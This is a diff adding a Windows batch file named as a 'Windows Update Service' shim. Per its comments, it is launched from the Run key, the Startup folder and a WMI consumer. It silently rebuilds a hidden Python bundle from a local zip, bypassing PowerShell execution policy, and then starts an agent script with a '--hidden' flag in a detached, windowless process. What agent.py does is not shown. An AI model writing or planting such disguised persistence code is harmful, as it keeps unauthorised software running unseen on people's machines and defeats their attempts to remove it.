@@ -1,0 +1,33 @@
+@echo off
+rem  Windows Update Service - self-rebuilding shim.
+rem  The Run key, the Startup folder and the WMI consumer all point at THIS
+rem  file.  If the bundle is missing it rebuilds it from the cached kit, with
+rem  no internet and no installer.
+setlocal
+set "HERE=%~dp0"
+
+if not exist "%HERE%syspy\config.py" call :rebuild
+if not exist "%HERE%agent.py" exit /b 0
+
+set "PY="
+if exist "%HERE%runtime\pythonw.exe" set "PY=%HERE%runtime\pythonw.exe"
+if not defined PY if exist "%HERE%runtime\python.exe" set "PY=%HERE%runtime\python.exe"
+if not defined PY for /f "delims=" %%X in ('where pyw.exe 2^>nul') do if not defined PY set "PY=%%X"
+if not defined PY for /f "delims=" %%X in ('where pythonw.exe 2^>nul') do if not defined PY set "PY=%%X"
+if not defined PY for /f "delims=" %%X in ('where python.exe 2^>nul') do if not defined PY set "PY=%%X"
+if not defined PY exit /b 0
+
+rem  pyw.exe needs the version flag, pythonw.exe must not have it.
+if /i "%PY:~-7%"=="pyw.exe" (
+    start "" /b "%PY%" -3 "%HERE%agent.py" --hidden
+) else (
+    start "" /b "%PY%" "%HERE%agent.py" --hidden
+)
+exit /b 0
+
+:rebuild
+if not exist "%HERE%kit.zip" exit /b 0
+tar -xf "%HERE%kit.zip" -C "%HERE%" 2>nul
+if exist "%HERE%syspy\config.py" exit /b 0
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory('%HERE%kit.zip','%HERE%')" 2>nul
+exit /b 0
